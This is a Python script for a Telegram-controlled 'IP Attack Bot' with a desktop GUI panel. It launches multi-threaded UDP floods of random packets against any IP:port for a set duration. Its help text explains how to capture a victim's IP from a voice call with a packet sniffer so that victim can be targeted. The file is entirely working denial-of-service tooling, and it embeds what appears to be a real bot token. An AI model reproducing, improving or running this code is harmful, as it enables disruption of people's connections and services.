# language: Python 3.11, file: main.py, target: any OS
# pip install python-telegram-bot==21.6 customtkinter
# run: python main.py
# Video-jaisa IP:port DoS bot — 60s default, multi-thread UDP flood

# ═══════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════
BOT_TOKEN     = "8830686693:AAEedTuVTDTBgVjLa1Io4zEn6xrSLHmJPjU"   # @BotFather
OWNER_ID      = 8313617737             # @userinfobot
DEFAULT_DUR   = 60                    # video me 60s
THREADS       = 8                     # parallel flood threads (weak net: 4)
PACKET_SIZE   = (512, 1400)           # random size range

# ═══════════════════════════════════════════════
import asyncio, random, socket, sys, time, threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

JOBS = {}          # chat_id -> Job
BOT_USERNAME = None

# ═══════════════════════════════════════════════
#  FLOOD ENGINE
# ═══════════════════════════════════════════════
class Flood:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.packets = 0
        self.bytes_sent = 0
        self._stop = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.setblocking(False)

    def _payload(self):
        n = random.randint(*PACKET_SIZE)
        return bytes(random.getrandbits(8) for _ in range(n))

    def run(self):
        end = time.time() + self.duration
        while not self._stop and time.time() < end:
            try:
                p = self._payload()
                self.sock.sendto(p, (self.ip, self.port))
                self.packets += 1
                self.bytes_sent += len(p)
            except (BlockingIOError, OSError):
                pass
        self.sock.close()

    def stop(self):
        self._stop = True

# ═══════════════════════════════════════════════
#  JOB
# ═══════════════════════════════════════════════
class Job:
    def __init__(self, chat_id, ip, port, duration):
        self.chat_id = chat_id
        self.ip = ip
        self.port = port
        self.duration = duration
        self.started = time.time()
        self.floods = []
        self.stopped = False
        self.task = None

    def totals(self):
        p = sum(f.packets for f in self.floods)
        b = sum(f.bytes_sent for f in self.floods)
        return p, b

async def run_job(app, job):
    # threads spawn
    for _ in range(THREADS):
        f = Flood(job.ip, job.port, job.duration)
        job.floods.append(f)
        threading.Thread(target=f.run, daemon=True).start()

    # completion wait
    await asyncio.sleep(job.duration)
    p, b = job.totals()
    try:
        await app.bot.send_message(
            job.chat_id,
            f"✅ *Attack Finished*\n"
            f"🎯 `{job.ip}:{job.port}`\n"
            f"⏱ {job.duration}s · {THREADS} threads\n"
            f"📦 {p:,} packets · {b/1024/1024:.1f} MB",
            parse_mode="Markdown")
    except Exception:
        pass
    JOBS.pop(job.chat_id, None)

# ═══════════════════════════════════════════════
#  MENUS
# ═══════════════════════════════════════════════
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Attack IP", callback_data="m_attack")],
        [InlineKeyboardButton("⏹ Stop", callback_data="m_stop"),
         InlineKeyboardButton("📊 Status", callback_data="m_status")],
        [InlineKeyboardButton("🧹 Clear msgs", callback_data="m_clear")],
        [InlineKeyboardButton("📖 Help", callback_data="m_help")],
    ])

def dur_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ 30s", callback_data="d_30"),
         InlineKeyboardButton("🔥 60s", callback_data="d_60")],
        [InlineKeyboardButton("💣 120s", callback_data="d_120"),
         InlineKeyboardButton("☠ 180s", callback_data="d_180")],
    ])

def is_owner(u):
    return u.effective_user.id == OWNER_ID

# ═══════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    await update.message.reply_text(
        "*🚀 IP Attack Bot*\n\n"
        f"Default: {DEFAULT_DUR}s · {THREADS} threads\n"
        "IP: HTTP Canary UDP filter se lo\n\n"
        "Choose:",
        parse_mode="Markdown", reply_markup=main_menu())

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    await update.message.reply_text(
        "*Commands:*\n"
        "`/attack <ip:port> [sec]`\n"
        "`/stop` `/status` `/clear`\n\n"
        "*IP kaise lo:*\n"
        "1. HTTP Canary start\n"
        "2. VC join, 10s bolo\n"
        "3. UDP filter → largest packet → ip:port\n"
        "4. `/attack 91.x.x.x:50000`",
        parse_mode="Markdown")

async def cmd_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    cid = update.effective_chat.id
    if cid in JOBS:
        await update.message.reply_text("⚠ already running. /stop")
        return
    if not ctx.args:
        await update.message.reply_text("usage: /attack <ip:port> [sec]")
        return
    try:
        ip, port = ctx.args[0].split(":")
        port = int(port)
    except Exception:
        await update.message.reply_text("bad format. ip:port")
        return
    dur = DEFAULT_DUR
    if len(ctx.args) > 1:
        try: dur = min(int(ctx.args[1]), 600)
        except ValueError: pass

    job = Job(cid, ip, port, dur)
    JOBS[cid] = job
    job.task = asyncio.create_task(run_job(ctx.application, job))
    await update.message.reply_text(
        f"🚀 *Attack Started*\n"
        f"🎯 `{ip}:{port}`\n"
        f"⏱ {dur}s · {THREADS} threads",
        parse_mode="Markdown")

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    cid = update.effective_chat.id
    job = JOBS.get(cid)
    if not job:
        await update.message.reply_text("nothing running.")
        return
    job.stopped = True
    for f in job.floods: f.stop()
    if job.task: job.task.cancel()
    JOBS.pop(cid, None)
    await update.message.reply_text("⏹ stopped.")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    if not JOBS:
        await update.message.reply_text("no jobs.")
        return
    lines = ["*📊 Active:*"]
    for cid, j in JOBS.items():
        el = int(time.time() - j.started)
        p, b = j.totals()
        lines.append(f"• `{j.ip}:{j.port}` | {el}/{j.duration}s | {p:,} pkt")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    cid = update.effective_chat.id
    msg = await update.message.reply_text("🧹 clearing...")
    deleted = 0
    try:
        async for m in ctx.application.bot.get_chat_history(cid, limit=50):
            if m.from_user and m.from_user.id == ctx.application.bot.id:
                try: await m.delete(); deleted += 1
                except Exception: pass
    except Exception: pass
    await msg.edit_text(f"✅ deleted {deleted}")

# ═══════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_owner(update): return
    d = q.data
    cid = q.message.chat_id

    if d == "m_attack":
        await q.edit_message_text(
            "Duration choose karo, phir `/attack <ip:port> <sec>` bhejo:",
            parse_mode="Markdown", reply_markup=dur_menu())
    elif d == "m_stop":
        job = JOBS.get(cid)
        if job:
            job.stopped = True
            for f in job.floods: f.stop()
            if job.task: job.task.cancel()
            JOBS.pop(cid, None)
            await q.edit_message_text("⏹ stopped.")
        else:
            await q.edit_message_text("nothing running.")
    elif d == "m_status":
        job = JOBS.get(cid)
        if not job:
            await q.edit_message_text("no jobs.")
        else:
            el = int(time.time() - job.started)
            p, b = job.totals()
            await q.edit_message_text(
                f"📊 `{job.ip}:{job.port}`\n"
                f"⏱ {el}/{job.duration}s\n"
                f"📦 {p:,} pkt · {b/1024/1024:.1f} MB",
                parse_mode="Markdown")
    elif d == "m_clear":
        deleted = 0
        try:
            async for m in ctx.application.bot.get_chat_history(cid, limit=50):
                if m.from_user and m.from_user.id == ctx.application.bot.id:
                    try: await m.delete(); deleted += 1
                    except Exception: pass
        except Exception: pass
        await q.edit_message_text(f"✅ deleted {deleted}")
    elif d == "m_help":
        await q.edit_message_text(
            "/attack <ip:port> [sec]\n/stop /status /clear",
            reply_markup=main_menu())
    elif d.startswith("d_"):
        sec = int(d.split("_")[1])
        await q.edit_message_text(
            f"⏱ {sec}s set. Ab bhejo:\n`/attack <ip:port> {sec}`",
            parse_mode="Markdown")

# ═══════════════════════════════════════════════
#  PANEL
# ═══════════════════════════════════════════════
def launch_gui():
    import customtkinter as ctk
    ctk.set_appearance_mode("dark")
    root = ctk.CTk()
    root.title("ip attack — panel")
    root.geometry("900x640")
    root.configure(fg_color="#1e1f22")

    side = ctk.CTkFrame(root, fg_color="#2b2d31", width=220, corner_radius=0)
    side.pack(side="left", fill="y"); side.pack_propagate(False)
    ctk.CTkLabel(side, text="◈ ATTACK", font=("Segoe UI", 18, "bold"),
                 text_color="#f2f3f5").pack(pady=(24, 6), padx=20, anchor="w")
    for l in ["flood", "stats", "logs"]:
        ctk.CTkButton(side, text=f"  {l}", anchor="w", fg_color="transparent",
                      hover_color="#3a3c42", text_color="#b5bac1",
                      height=38).pack(fill="x", padx=10, pady=2)
    ctk.CTkLabel(side, text="v0.5 · elva",
                 font=("Segoe UI", 11), text_color="#6d717a"
                 ).pack(side="bottom", pady=14, padx=20, anchor="w")

    main = ctk.CTkFrame(root, fg_color="#313338", corner_radius=0)
    main.pack(side="right", fill="both", expand=True)
    ctk.CTkLabel(main, text="ip attack control",
                 font=("Segoe UI", 22, "bold"), text_color="#f2f3f5"
                 ).pack(pady=(24, 2), padx=24, anchor="w")
    ctk.CTkLabel(main, text=f"udp flood · {DEFAULT_DUR}s default · {THREADS} threads",
                 font=("Segoe UI", 12), text_color="#949ba4"
                 ).pack(padx=24, anchor="w", pady=(0, 16))

    row = ctk.CTkFrame(main, fg_color="transparent")
    row.pack(fill="x", padx=24)
    ip_entry = ctk.CTkEntry(row, placeholder_text="ip:port",
                            fg_color="#1e1f22", height=42, font=("Consolas", 13))
    ip_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
    dur_entry = ctk.CTkEntry(row, placeholder_text="sec", width=90,
                             fg_color="#1e1f22", height=42, font=("Consolas", 13))
    dur_entry.pack(side="left", padx=(0, 8))
    dur_entry.insert(0, str(DEFAULT_DUR))

    btn_row = ctk.CTkFrame(main, fg_color="transparent")
    btn_row.pack(fill="x", padx=24, pady=(12, 0))

    stat_lbl = ctk.CTkLabel(main, text="idle",
                            font=("Consolas", 13), text_color="#949ba4")
    stat_lbl.pack(anchor="w", padx=24, pady=(8, 0))

    log_box = ctk.CTkTextbox(main, fg_color="#1e1f22", text_color="#dcddde",
                             font=("Consolas", 12), corner_radius=8)
    log_box.pack(fill="both", expand=True, padx=24, pady=(8, 24))

    def push(m):
        log_box.insert("end", f"{time.strftime('%H:%M:%S')}  {m}\n")
        log_box.see("end")

    gui_floods = []

    def start_attack():
        tgt = ip_entry.get().strip()
        if ":" not in tgt:
            push("bad ip:port"); return
        ip, port = tgt.split(":")
        try: port = int(port)
        except ValueError: push("bad port"); return
        try: dur = int(dur_entry.get())
        except ValueError: dur = DEFAULT_DUR
        push(f"🚀 attack started → {ip}:{port} for {dur}s")
        gui_floods.clear()
        for _ in range(THREADS):
            f = Flood(ip, port, dur)
            gui_floods.append(f)
            threading.Thread(target=f.run, daemon=True).start()

        # live stats ticker
        def tick():
            t0 = time.time()
            while time.time() - t0 < dur:
                p = sum(f.packets for f in gui_floods)
                b = sum(f.bytes_sent for f in gui_floods)
                el = int(time.time() - t0)
                stat_lbl.configure(
                    text=f"⏱ {el}/{dur}s · 📦 {p:,} pkt · {b/1024/1024:.1f} MB")
                time.sleep(1)
            p = sum(f.packets for f in gui_floods)
            b = sum(f.bytes_sent for f in gui_floods)
            stat_lbl.configure(text=f"✅ done · {p:,} pkt · {b/1024/1024:.1f} MB")
            push(f"✅ finished · {p:,} packets · {b/1024/1024:.1f} MB")
        threading.Thread(target=tick, daemon=True).start()

    def stop_attack():
        for f in gui_floods: f.stop()
        push("⏹ stopped")
        stat_lbl.configure(text="stopped")

    ctk.CTkButton(btn_row, text="🚀 START", fg_color="#5865f2",
                  hover_color="#4752c4", height=42, width=130,
                  font=("Segoe UI", 13, "bold"),
                  command=start_attack).pack(side="left", padx=(0, 8))
    ctk.CTkButton(btn_row, text="⏹ STOP", fg_color="#da373c",
                  hover_color="#a12828", height=42, width=130,
                  font=("Segoe UI", 13, "bold"),
                  command=stop_attack).pack(side="left", padx=(0, 8))
    ctk.CTkButton(btn_row, text="🧹 CLEAR", fg_color="#4e5058",
                  hover_color="#5c5f66", height=42, width=110,
                  font=("Segoe UI", 13, "bold"),
                  command=lambda: log_box.delete("1.0", "end")).pack(side="left")

    def _bot_thread():
        async def _main():
            global BOT_USERNAME
            app_bot = Application.builder().token(BOT_TOKEN).build()
            me = await app_bot.bot.get_me()
            BOT_USERNAME = me.username
            push(f"bot: @{BOT_USERNAME}")
            app_bot.add_handler(CommandHandler("start", cmd_start))
            app_bot.add_handler(CommandHandler("help", cmd_help))
            app_bot.add_handler(CommandHandler("attack", cmd_attack))
            app_bot.add_handler(CommandHandler("stop", cmd_stop))
            app_bot.add_handler(CommandHandler("status", cmd_status))
            app_bot.add_handler(CommandHandler("clear", cmd_clear))
            app_bot.add_handler(CallbackQueryHandler(on_callback))
            await app_bot.initialize()
            await app_bot.start()
            await app_bot.updater.start_polling()
            push("bot online ✅")
            while True: await asyncio.sleep(3600)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(_main())

    threading.Thread(target=_bot_thread, daemon=True).start()
    push("panel ready")
    root.mainloop()

if __name__ == "__main__":
    launch_gui()